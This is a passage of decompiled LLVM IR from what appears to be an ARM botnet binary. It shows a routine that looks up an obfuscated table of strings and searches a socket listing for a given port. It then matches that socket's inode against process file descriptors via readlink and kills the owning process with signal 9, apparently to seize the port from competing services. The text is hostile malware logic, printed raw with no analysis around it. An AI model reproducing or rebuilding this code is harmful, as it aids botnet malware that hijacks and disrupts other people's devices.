  %v27_c9a8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c9c4 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c9c4, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9f0 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9f0, i32* @fp, align 4
  %v4_c9fc = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_ca00 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_ca00, i32* @sl, align 4
  %v0_ca04 = load i32, i32* @r5, align 4
  %v3_ca10 = bitcast i32* %stack_var_-8777 to i8*
  %v4_ca10 = call i32 @__GI_memset(i8* %v3_ca10, i32 %v0_ca04, i32 4096)
  %v0_ca18 = load i32, i32* @r5, align 4
  %v3_ca24 = bitcast i32* %stack_var_-4681 to i8*
  %v4_ca24 = call i32 @__GI_memset(i8* %v3_ca24, i32 %v0_ca18, i32 4096)
  %v2_ca28 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_ca28, i32* @sb, align 4
  %v0_ca2c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca2c = udiv i32 %v0_ca2c, 256
  %v1_ca30 = urem i32 %v0_ca2c, 256
  store i32 %v1_ca30, i32* @r4, align 4
  %v3_ca40 = trunc i32 %v3_ca2c to i8
  %v4_ca40 = call i32 @util_itoa(i8 %v3_ca40, i32 16, i32 %v2_ca28)
  %v2_ca48 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca4c = icmp eq i32 %v2_ca48, 2
  br i1 %v7_ca4c, label %dec_label_pc_cf10, label %dec_label_pc_ca54

dec_label_pc_ca54:                                ; preds = %entry, %dec_label_pc_cf10
  %v1_ca58 = call i32 @table_unlock_val(i32 15)
  %v1_ca60 = call i32 @table_unlock_val(i32 16)
  %v1_ca68 = call i32 @table_unlock_val(i32 17)
  %v1_ca70 = call i32 @table_unlock_val(i32 19)
  %v0_ca74 = load i32, i32* @r5, align 4
  %v2_ca7c = inttoptr i32 %v0_ca74 to i32*
  %v3_ca7c = call i32 @table_retrieve_val(i32 19, i32* %v2_ca7c)
  %v0_ca80 = load i32, i32* @r5, align 4
  %v2_ca84 = call i32 @__libc_open(i32 %v3_ca7c, i32 %v0_ca80)
  %v7_ca88 = icmp eq i32 %v2_ca84, -1
  store i32 %v2_ca84, i32* @r8, align 4
  br i1 %v7_ca88, label %bb, label %dec_label_pc_ca98.preheader

bb:                                               ; preds = %dec_label_pc_ca54
  %v1_ca90 = load i32, i32* @r5, align 4
  store i32 %v1_ca90, i32* @r4, align 4
  br label %dec_label_pc_ceac

dec_label_pc_ca98.preheader:                      ; preds = %dec_label_pc_ca54
  %v4_caa456 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca84)
  %v2_caa858 = icmp eq i32 %v4_caa456, 0
  br i1 %v2_caa858, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0.lr.ph

dec_label_pc_cab0.lr.ph:                          ; preds = %dec_label_pc_ca98.preheader
  %v2_caf8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_cab0.lr.ph, %dec_label_pc_ca98.backedge
  %v3_cab4 = load i8, i8* %stack_var_-585, align 1
  %v4_cab4 = sext i8 %v3_cab4 to i32
  store i32 %v4_cab4, i32* @r3, align 4
  %v2_cab8 = icmp eq i8 %v3_cab4, 0
  br i1 %v2_cab8, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_cab0
  %v8_cabc = icmp eq i8 %v3_cab4, 58
  br i1 %v8_cabc, label %.thread8, label %dec_label_pc_cad0

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cae8

bb126:                                            ; preds = %dec_label_pc_cab0
  br label %dec_label_pc_cae8

dec_label_pc_cad0:                                ; preds = %bb125
  %v1_cad8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cad4

dec_label_pc_cad4:                                ; preds = %bb127, %dec_label_pc_cad0
  %v0_cad4 = phi i32 [ %v1_cad4, %bb127 ], [ 0, %dec_label_pc_cad0 ]
  %v1_cad4 = add i32 %v0_cad4, 1
  %v2_cad8 = add i32 %v1_cad4, %v1_cad8.pre
  %v3_cad8 = inttoptr i32 %v2_cad8 to i8*
  %v4_cad8 = load i8, i8* %v3_cad8, align 1
  %v6_cad8 = zext i8 %v4_cad8 to i32
  store i32 %v6_cad8, i32* @r3, align 4
  %v2_cadc = icmp eq i8 %v4_cad8, 0
  br i1 %v2_cadc, label %dec_label_pc_cae8, label %bb127

bb127:                                            ; preds = %dec_label_pc_cad4
  %v8_cae0 = icmp eq i8 %v4_cad8, 58
  br i1 %v8_cae0, label %dec_label_pc_cae8, label %dec_label_pc_cad4

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cad4, %bb127, %bb126, %.thread8
  %v1_cb14 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_cad4, %bb127 ], [ %v1_cad4, %dec_label_pc_cad4 ]
  %v0_cae8 = phi i32 [ %v4_cab4, %.thread8 ], [ %v4_cab4, %bb126 ], [ %v6_cad8, %bb127 ], [ %v6_cad8, %dec_label_pc_cad4 ]
  %v2_cae8 = icmp eq i32 %v0_cae8, 0
  br i1 %v2_cae8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_caf0

dec_label_pc_ca98.backedge:                       ; preds = %dec_label_pc_cae8, %dec_label_pc_cbb8, %dec_label_pc_cc04, %dec_label_pc_cb34
  %v0_caa0 = load i32, i32* @r8, align 4
  %v4_caa4 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_caa0)
  %v2_caa8 = icmp eq i32 %v4_caa4, 0
  br i1 %v2_caa8, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cae8
  %v1_caf4 = add i32 %v1_cb14, 2
  %v2_cafc = add i32 %v1_caf4, %v2_caf8
  %v1_cb00 = add i32 %v2_cafc, -545
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v2_cb04 = icmp eq i8 %v3_cb00, 0
  br i1 %v2_cb04, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_caf0
  %v8_cb08 = icmp eq i8 %v3_cb00, 32
  br i1 %v8_cb08, label %.thread13, label %dec_label_pc_cb14

.thread13:                                        ; preds = %bb128
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb129:                                            ; preds = %dec_label_pc_caf0
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

dec_label_pc_cb14:                                ; preds = %bb128
  %v0_cb14 = load i32, i32* @r6, align 4
  %v2_cb14 = add i32 %v0_cb14, %v1_cb14
  br label %dec_label_pc_cb1c

dec_label_pc_cb1c:                                ; preds = %bb130, %dec_label_pc_cb14
  %v0_cb2816 = phi i32 [ %v1_cb28, %bb130 ], [ %v1_caf4, %dec_label_pc_cb14 ]
  %v0_cb2c18 = phi i32 [ %v1_cb2c, %bb130 ], [ %v2_cb14, %dec_label_pc_cb14 ]
  %v1_cb1c = add i32 %v0_cb2c18, 3
  %v2_cb1c = inttoptr i32 %v1_cb1c to i8*
  %v3_cb1c = load i8, i8* %v2_cb1c, align 1
  %v2_cb20 = icmp eq i8 %v3_cb1c, 0
  br i1 %v2_cb20, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cb1c
  %v1_cb2817 = add i32 %v0_cb2816, 1
  store i32 %v1_cb2817, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb130:                                            ; preds = %dec_label_pc_cb1c
  %v8_cb24 = icmp eq i8 %v3_cb1c, 32
  %v1_cb28 = add i32 %v0_cb2816, 1
  store i32 %v1_cb28, i32* @r5, align 4
  %v1_cb2c = add i32 %v0_cb2c18, 1
  br i1 %v8_cb24, label %dec_label_pc_cb34, label %dec_label_pc_cb1c

dec_label_pc_cb34:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb40 = phi i32 [ %v1_cb2817, %.thread15 ], [ %v1_caf4, %.thread13 ], [ %v1_caf4, %bb129 ], [ %v1_cb28, %bb130 ]
  %v0_cb34 = load i32, i32* @r6, align 4
  %v2_cb34 = add i32 %v0_cb34, %v1_caf4
  store i32 %v2_cb34, i32* @r4, align 4
  %v2_cb40 = add i32 %v1_cb40, %v2_caf8
  store i32 0, i32* @r7, align 4
  %v3_cb48 = add i32 %v2_cb40, -545
  %v4_cb48 = inttoptr i32 %v3_cb48 to i8*
  store i8 0, i8* %v4_cb48, align 1
  %v0_cb4c = load i32, i32* @r4, align 4
  %v1_cb50 = inttoptr i32 %v0_cb4c to i8*
  %v2_cb50 = call i32 @util_strlen(i8* %v1_cb50)
  store i32 %v2_cb50, i32* @r1, align 4
  %v0_cb5c = load i32, i32* @r4, align 4
  %v3_cb60 = inttoptr i32 %v0_cb5c to i8*
  %v4_cb60 = call i32 @util_stristr(i8* %v3_cb60, i32 %v2_cb50, i32 %v2_ca28)
  %v7_cb64 = icmp eq i32 %v4_cb60, -1
  br i1 %v7_cb64, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cb80.preheader

dec_label_pc_cb80.preheader:                      ; preds = %dec_label_pc_cb34
  %v1_cb68 = load i32, i32* @r7, align 4
  %v1_cb6c = load i32, i32* @r6, align 4
  %v2_cb6c = load i32, i32* @r5, align 4
  %v3_cb6c = add i32 %v2_cb6c, %v1_cb6c
  store i32 %v1_cb68, i32* @lr, align 4
  %v1_cb8048 = add i32 %v3_cb6c, 2
  %v2_cb8049 = inttoptr i32 %v1_cb8048 to i8*
  %v3_cb8050 = load i8, i8* %v2_cb8049, align 1
  %v4_cb8051 = zext i8 %v3_cb8050 to i32
  store i32 %v4_cb8051, i32* @r3, align 4
  %v2_cb8452 = icmp eq i8 %v3_cb8050, 0
  %v1_cb8854 = add i32 %v2_cb6c, 2
  br i1 %v2_cb8452, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb80.preheader, %dec_label_pc_cb80.backedge
  %v0_cbb883 = phi i32 [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cba0.pr = phi i32 [ %v0_cba0.pr70, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cec0 = phi i32 [ %v0_cec073, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cb8878 = phi i32 [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v1_cb8854, %dec_label_pc_cb80.preheader ]
  %v0_cbb0 = phi i32 [ %v0_cb80, %dec_label_pc_cb80.backedge ], [ %v3_cb6c, %dec_label_pc_cb80.preheader ]
  %v1_cb94 = phi i32 [ %v4_cb80, %dec_label_pc_cb80.backedge ], [ %v4_cb8051, %dec_label_pc_cb80.preheader ]
  %v7_cb90 = icmp eq i32 %v1_cb94, 9
  br i1 %v7_cb90, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb90
  %v8_cb94 = icmp eq i32 %v1_cb94, 32
  br i1 %v8_cb94, label %.thread27, label %dec_label_pc_cba0

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cbac

bb132:                                            ; preds = %dec_label_pc_cb90
  br label %dec_label_pc_cbac

dec_label_pc_cba0:                                ; preds = %bb131
  %v7_cba0 = icmp eq i32 %v0_cba0.pr, 1
  br i1 %v7_cba0, label %dec_label_pc_cec0, label %dec_label_pc_cba8

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cec0, %dec_label_pc_cba0
  %v0_cbac75 = phi i32 [ %v1_cec0, %dec_label_pc_cec0 ], [ %v0_cec0, %dec_label_pc_cba0 ]
  br label %dec_label_pc_cbac

dec_label_pc_cbac:                                ; preds = %bb132, %.thread27, %dec_label_pc_cba8
  %v0_cbac = phi i32 [ %v0_cec0, %.thread27 ], [ %v0_cec0, %bb132 ], [ %v0_cbac75, %dec_label_pc_cba8 ]
  %v0_cba0.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cba8 ]
  %v7_cbb4 = icmp sgt i32 %v0_cbac, 6
  br i1 %v7_cbb4, label %dec_label_pc_cbb8, label %dec_label_pc_cb80.backedge

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cb80.backedge, %dec_label_pc_cbac, %dec_label_pc_cb80.preheader
  %v1_cc08 = phi i32 [ %v1_cb8854, %dec_label_pc_cb80.preheader ], [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v0_cb8878, %dec_label_pc_cbac ]
  %v0_cbb8 = phi i32 [ %v1_cb68, %dec_label_pc_cb80.preheader ], [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v2_cbb8 = icmp eq i32 %v0_cbb8, 0
  br i1 %v2_cbb8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbb8
  %v2_cbcc = add i32 %v1_cc08, %v2_caf8
  %v1_cbd0 = add i32 %v2_cbcc, -545
  %v2_cbd0 = inttoptr i32 %v1_cbd0 to i8*
  %v3_cbd0 = load i8, i8* %v2_cbd0, align 1
  %v2_cbd4 = icmp eq i8 %v3_cbd0, 0
  br i1 %v2_cbd4, label %dec_label_pc_cc04, label %bb133

bb133:                                            ; preds = %dec_label_pc_cbc4
  %v8_cbd8 = icmp eq i8 %v3_cbd0, 32
  br i1 %v8_cbd8, label %dec_label_pc_cc04, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %bb133
  %v2_cbe0 = add i32 %v1_cc08, %v1_cb6c
  br label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %bb134, %dec_label_pc_cbe0
  %v0_cbf030 = phi i32 [ %v1_cbf0, %bb134 ], [ %v1_cc08, %dec_label_pc_cbe0 ]
  %v0_cbe4 = phi i32 [ %v1_cbe4, %bb134 ], [ %v2_cbe0, %dec_label_pc_cbe0 ]
  %v1_cbe4 = add i32 %v0_cbe4, 1
  %v2_cbe4 = inttoptr i32 %v1_cbe4 to i8*
  %v3_cbe4 = load i8, i8* %v2_cbe4, align 1
  %v2_cbe8 = icmp eq i8 %v3_cbe4, 0
  br i1 %v2_cbe8, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbe4
  %v1_cbf031 = add i32 %v0_cbf030, 1
  br label %dec_label_pc_cbf8

bb134:                                            ; preds = %dec_label_pc_cbe4
  %v8_cbec = icmp eq i8 %v3_cbe4, 32
  %v1_cbf0 = add i32 %v0_cbf030, 1
  br i1 %v8_cbec, label %dec_label_pc_cbf8, label %dec_label_pc_cbe4

dec_label_pc_cbf8:                                ; preds = %bb134, %.thread29
  %v1_cc00 = phi i32 [ %v1_cbf031, %.thread29 ], [ %v1_cbf0, %bb134 ]
  %v2_cc00 = add i32 %v1_cc00, %v2_caf8
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbc4, %bb133, %dec_label_pc_cbf8
  %v2_cc10 = phi i32 [ %v2_cbcc, %dec_label_pc_cbc4 ], [ %v2_cbcc, %bb133 ], [ %v2_cc00, %dec_label_pc_cbf8 ]
  %v2_cc08 = add i32 %v1_cc08, %v1_cb6c
  store i32 %v2_cc08, i32* @r4, align 4
  %v3_cc10 = add i32 %v2_cc10, -545
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 1
  %v1_cc14 = inttoptr i32 %v2_cc08 to i8*
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14)
  %v8_cc1c = icmp sgt i32 %v2_cc14, 15
  br i1 %v8_cc1c, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v0_cc24 = load i32, i32* @r4, align 4
  %v2_cc28 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cc28, i32* @r0, align 4
  %v2_cc2c = bitcast i32* %stack_var_-56 to i8*
  %v3_cc2c = call i32 @util_strcpy(i8* %v2_cc2c, i32 %v0_cc24)
  br label %dec_label_pc_cc30

dec_label_pc_cc30.loopexit:                       ; preds = %dec_label_pc_ca98.backedge, %dec_label_pc_ca98.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc30.loopexit, %dec_label_pc_cc20
  %v1_cc40.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc30.loopexit ], [ %v2_cc2c, %dec_label_pc_cc20 ]
  %v2_cc3c.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc30.loopexit ], [ %v2_cc28, %dec_label_pc_cc20 ]
  %v0_cc30 = load i32, i32* @r8, align 4
  %v1_cc34 = call i32 @__GI___libc_close(i32 %v0_cc30)
  %v2_cc40 = call i32 @util_strlen(i8* %v1_cc40.pre-phi)
  store i32 %v2_cc40, i32* @r4, align 4
  %v2_cc44 = icmp eq i32 %v2_cc40, 0
  br i1 %v2_cc44, label %dec_label_pc_ceec, label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc30
  %v3_cc54 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_cc58 = call i32 @__GI_opendir(i32 %v3_cc54)
  store i32 %v1_cc58, i32* @sb, align 4
  %v2_cc5c = icmp eq i32 %v1_cc58, 0
  br i1 %v2_cc5c, label %dec_label_pc_ce8c, label %dec_label_pc_cc6c.preheader

dec_label_pc_cc6c.preheader:                      ; preds = %dec_label_pc_cc4c
  store i32 0, i32* @r5, align 4
  %v1_cc7043 = inttoptr i32 %v1_cc58 to i32*
  %v2_cc7044 = call i32 @__GI_readdir(i32* %v1_cc7043)
  %v2_cc7446 = icmp eq i32 %v2_cc7044, 0
  br i1 %v2_cc7446, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc6c.loopexit:                       ; preds = %dec_label_pc_cc84, %dec_label_pc_cc94, %dec_label_pc_cd00
  %v0_cc6c = load i32, i32* @sb, align 4
  %v1_cc70 = inttoptr i32 %v0_cc6c to i32*
  %v2_cc70 = call i32 @__GI_readdir(i32* %v1_cc70)
  %v2_cc74 = icmp eq i32 %v2_cc70, 0
  br i1 %v2_cc74, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc7c.preheader:                      ; preds = %dec_label_pc_cc6c.preheader, %dec_label_pc_cc6c.loopexit
  %v0_cc8491 = phi i32 [ %v2_cc70, %dec_label_pc_cc6c.loopexit ], [ %v2_cc7044, %dec_label_pc_cc6c.preheader ]
  br label %dec_label_pc_cc7c

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc7c.preheader, %dec_label_pc_ce68
  %v0_cc9c = phi i32 [ %v0_cc8491, %dec_label_pc_cc7c.preheader ], [ %v2_ce74, %dec_label_pc_ce68 ]
  %v0_cc7c = load i32, i32* @r5, align 4
  %v2_cc7c = icmp eq i32 %v0_cc7c, 0
  br i1 %v2_cc7c, label %dec_label_pc_cc84, label %dec_label_pc_ce80

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cc7c
  %v1_cc84 = add i32 %v0_cc9c, 11
  %v2_cc84 = inttoptr i32 %v1_cc84 to i8*
  %v3_cc84 = load i8, i8* %v2_cc84, align 1
  %v4_cc84 = zext i8 %v3_cc84 to i32
  %v1_cc88 = add nsw i32 %v4_cc84, -48
  %tmp = icmp ugt i32 %v1_cc88, 9
  br i1 %tmp, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc84
  store i32 %v1_cc84, i32* @r7, align 4
  %v3_cca0 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_ccac = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cca0)
  %v2_ccb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_ccb8 = load i32, i32* @r7, align 4
  %v1_ccbc = load i32, i32* @sl, align 4
  %v2_ccbc = add i32 %v1_ccbc, %v2_ccb4
  store i32 %v2_ccbc, i32* @r0, align 4
  %v2_ccc0 = inttoptr i32 %v2_ccbc to i8*
  %v3_ccc0 = call i32 @util_strcpy(i8* %v2_ccc0, i32 %v0_ccb8)
  %v2_ccc8 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cccc = load i32, i32* @r5, align 4
  store i32 %v2_ccc8, i32* @r4, align 4
  %v2_ccd8 = inttoptr i32 %v0_cccc to i32*
  %v3_ccd8 = call i32 @table_retrieve_val(i32 16, i32* %v2_ccd8)
  %v0_cce0 = load i32, i32* @r4, align 4
  %v1_cce0 = load i32, i32* @sl, align 4
  %v2_cce0 = add i32 %v1_cce0, %v0_cce0
  store i32 %v2_cce0, i32* @r0, align 4
  %v2_cce4 = inttoptr i32 %v2_cce0 to i8*
  %v3_cce4 = call i32 @util_strcpy(i8* %v2_cce4, i32 %v3_ccd8)
  %v3_ccf4 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ccf8 = icmp eq i32 %v3_ccf4, -1
  br i1 %v7_ccf8, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd00

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  %v0_cd00 = load i32, i32* @r5, align 4
  %v2_cd08 = inttoptr i32 %v0_cd00 to i32*
  %v3_cd08 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd08)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd14 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd08)
  %v2_cd1c = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd20 = load i32, i32* @r7, align 4
  %v1_cd24 = load i32, i32* @sl, align 4
  %v2_cd24 = add i32 %v1_cd24, %v2_cd1c
  store i32 %v2_cd24, i32* @r0, align 4
  %v2_cd28 = inttoptr i32 %v2_cd24 to i8*
  %v3_cd28 = call i32 @util_strcpy(i8* %v2_cd28, i32 %v0_cd20)
  %v2_cd30 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd34 = load i32, i32* @r5, align 4
  store i32 %v2_cd30, i32* @r4, align 4
  %v2_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v3_cd40 = call i32 @table_retrieve_val(i32 17, i32* %v2_cd40)
  %v0_cd48 = load i32, i32* @r4, align 4
  %v1_cd48 = load i32, i32* @sl, align 4
  %v2_cd48 = add i32 %v1_cd48, %v0_cd48
  store i32 %v2_cd48, i32* @r0, align 4
  %v2_cd4c = inttoptr i32 %v2_cd48 to i8*
  %v3_cd4c = call i32 @util_strcpy(i8* %v2_cd4c, i32 %v3_cd40)
  %v1_cd54 = call i32 @__GI_opendir(i32 %v2_ca00)
  store i32 %v1_cd54, i32* @r8, align 4
  %v2_cd58 = icmp eq i32 %v1_cd54, 0
  br i1 %v2_cd58, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd60.preheader

dec_label_pc_cd60.preheader:                      ; preds = %dec_label_pc_cd00
  %v1_cd6438 = inttoptr i32 %v1_cd54 to i32*
  %v2_cd6439 = call i32 @__GI_readdir(i32* %v1_cd6438)
  store i32 %v2_cd6439, i32* @r6, align 4
  %v2_cd6841 = icmp eq i32 %v2_cd6439, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd6841, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd60.loopexit:                       ; preds = %dec_label_pc_cd80, %dec_label_pc_ce18
  %v0_cd60 = load i32, i32* @r8, align 4
  %v1_cd64 = inttoptr i32 %v0_cd60 to i32*
  %v2_cd64 = call i32 @__GI_readdir(i32* %v1_cd64)
  store i32 %v2_cd64, i32* @r6, align 4
  %v2_cd68 = icmp eq i32 %v2_cd64, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd68, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd78thread-pre-split:                ; preds = %dec_label_pc_cd60.preheader, %dec_label_pc_cd60.loopexit
  %v0_cd78.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd78

dec_label_pc_cd78:                                ; preds = %dec_label_pc_cd78thread-pre-split, %dec_label_pc_ce40
  %v0_cd78 = phi i32 [ %v0_cd78.pr, %dec_label_pc_cd78thread-pre-split ], [ 1, %dec_label_pc_ce40 ]
  %v2_cd78 = icmp eq i32 %v0_cd78, 0
  br i1 %v2_cd78, label %dec_label_pc_cd80, label %dec_label_pc_ce68

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd78
  %v0_cd80 = call i32 @util_zero()
  %v0_cd84 = load i32, i32* @r5, align 4
  %v2_cd8c = inttoptr i32 %v0_cd84 to i32*
  %v3_cd8c = call i32 @table_retrieve_val(i32 15, i32* %v2_cd8c)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd98 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd8c)
  %v2_cda0 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cda4 = load i32, i32* @r7, align 4
  %v1_cda8 = load i32, i32* @sl, align 4
  %v2_cda8 = add i32 %v1_cda8, %v2_cda0
  store i32 %v2_cda8, i32* @r0, align 4
  %v2_cdac = inttoptr i32 %v2_cda8 to i8*
  %v3_cdac = call i32 @util_strcpy(i8* %v2_cdac, i32 %v0_cda4)
  %v2_cdb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdb8 = load i32, i32* @r5, align 4
  store i32 %v2_cdb4, i32* @r4, align 4
  %v2_cdc4 = inttoptr i32 %v0_cdb8 to i32*
  %v3_cdc4 = call i32 @table_retrieve_val(i32 17, i32* %v2_cdc4)
  %v0_cdcc = load i32, i32* @r4, align 4
  %v1_cdcc = load i32, i32* @sl, align 4
  %v2_cdcc = add i32 %v1_cdcc, %v0_cdcc
  store i32 %v2_cdcc, i32* @r0, align 4
  %v2_cdd0 = inttoptr i32 %v2_cdcc to i8*
  %v3_cdd0 = call i32 @util_strcpy(i8* %v2_cdd0, i32 %v3_cdc4)
  %v2_cdd8 = call i32 @util_strlen(i8* %v3_ca24)
  %v1_cde0 = load i32, i32* @sl, align 4
  %v2_cde0 = add i32 %v1_cde0, %v2_cdd8
  store i32 %v2_cde0, i32* @r0, align 4
  %v2_cde4 = inttoptr i32 %v2_cde0 to i8*
  %v3_cde4 = call i32 @util_strcpy(i8* %v2_cde4, i32 ptrtoint (i32* @global_var_19278.72 to i32))
  %v2_cdec = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdf0 = load i32, i32* @r6, align 4
  %v1_cdf0 = add i32 %v0_cdf0, 11
  %v1_cdf4 = load i32, i32* @sl, align 4
  %v2_cdf4 = add i32 %v1_cdf4, %v2_cdec
  store i32 %v2_cdf4, i32* @r0, align 4
  %v2_cdf8 = inttoptr i32 %v2_cdf4 to i8*
  %v3_cdf8 = call i32 @util_strcpy(i8* %v2_cdf8, i32 %v1_cdf0)
  %v3_ce08 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ce0c = icmp eq i32 %v3_ce08, -1
  br i1 %v7_ce0c, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cd80
  %v2_ce18 = call i32 @util_strlen(i8* %v3_ca10)
  store i32 %v2_ce18, i32* @r1, align 4
  %v4_ce2c = call i32 @util_stristr(i8* %v3_ca10, i32 %v2_ce18, i32 %v2_cc3c.pre-phi)
  %v7_ce30 = icmp eq i32 %v4_ce2c, -1
  br i1 %v7_ce30, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce18
  %v0_ce38 = load i32, i32* @r7, align 4
  %v2_ce40 = inttoptr i32 %v0_ce38 to i8*
  %v3_ce40 = call i32 @util_atoi(i8* %v2_ce40, i32 10)
  %v2_ce48 = call i32 @kill(i32 %v3_ce40, i32 9)
  %v0_ce4c = load i32, i32* @r8, align 4
  %v1_ce50 = inttoptr i32 %v0_ce4c to i32*
  %v2_ce50 = call i32 @__GI_readdir(i32* %v1_ce50)
  store i32 %v2_ce50, i32* @r6, align 4
  %v2_ce54 = icmp eq i32 %v2_ce50, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_ce54, label %dec_label_pc_ce68, label %dec_label_pc_cd78

dec_label_pc_ce68:                                ; preds = %dec_label_pc_cd60.loopexit, %dec_label_pc_ce40, %dec_label_pc_cd78, %dec_label_pc_cd60.preheader
  %v0_ce68 = load i32, i32* @r8, align 4
  %v1_ce6c = inttoptr i32 %v0_ce68 to i32*
  %v2_ce6c = call i32 @__GI_closedir(i32* %v1_ce6c)
  %v0_ce70 = load i32, i32* @sb, align 4
  %v1_ce74 = inttoptr i32 %v0_ce70 to i32*
  %v2_ce74 = call i32 @__GI_readdir(i32* %v1_ce74)
  %v2_ce78 = icmp eq i32 %v2_ce74, 0
